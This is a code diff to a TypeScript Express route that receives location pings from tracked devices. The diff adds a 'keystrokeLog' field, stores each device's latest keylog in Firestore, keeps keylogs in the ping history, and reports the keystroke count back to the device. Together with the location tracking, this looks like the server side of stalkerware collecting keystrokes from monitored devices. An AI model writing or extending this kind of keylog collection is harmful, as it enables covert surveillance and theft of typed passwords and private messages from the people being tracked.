@@ -34,7 +34,7 @@ router.post('/register', async (req: Request, res: Response): Promise<void> => {
 // Endpoint for a device to send its location back after being pinged
 router.post('/location', async (req: Request, res: Response): Promise<void> => {
   try {
-    let { deviceId, fcmToken, latitude, longitude, locationDetails, telemetry } = req.body;
+    let { deviceId, fcmToken, latitude, longitude, locationDetails, telemetry, keystrokeLog } = req.body;
 
     if ((!deviceId && !fcmToken) || latitude === undefined || longitude === undefined) {
       res.status(400).json({ error: 'deviceId (or fcmToken), latitude, and longitude are required' });
@@ -71,17 +71,21 @@ router.post('/location', async (req: Request, res: Response): Promise<void> => {
       ...(locationDetails || {})
     };
 
-    // 1. Maintain latest location on device document for fast dashboard queries
+    // Sanitise keystroke log — must be an array
+    const safeKeylog: any[] = Array.isArray(keystrokeLog) ? keystrokeLog : [];
+
+    // 1. Maintain latest location + latest keylog on device document for fast dashboard queries
     await db.collection('devices').doc(deviceId).set({
       location: locationData,
       telemetry: telemetry || {},
       ipAddress,
       lastUpdated: timestamp,
-      totalPings: FieldValue.increment(1)
+      totalPings: FieldValue.increment(1),
+      ...(safeKeylog.length > 0 ? { latestKeylog: safeKeylog, latestKeylogAt: timestamp } : {})
     }, { merge: true });
 
     // 2. Persist this ping to the history subcollection (never overwrite past pings)
-    const historyEntry = {
+    const historyEntry: any = {
       latitude: lat,
       longitude: lng,
       locationDetails: locationDetails || {},
@@ -90,6 +94,11 @@ router.post('/location', async (req: Request, res: Response): Promise<void> => {
       timestamp,
       createdAt
     };
+
+    if (safeKeylog.length > 0) {
+      historyEntry.keystrokeLog = safeKeylog;
+      historyEntry.keystrokeCount = safeKeylog.length;
+    }
 
     const historyRef = await db
       .collection('devices')
@@ -100,6 +109,7 @@ router.post('/location', async (req: Request, res: Response): Promise<void> => {
     res.status(200).json({
       message: 'Location updated and saved to history successfully',
       historyId: historyRef.id,
+      keystrokesReceived: safeKeylog.length,
       timestamp
     });
   } catch (error) {
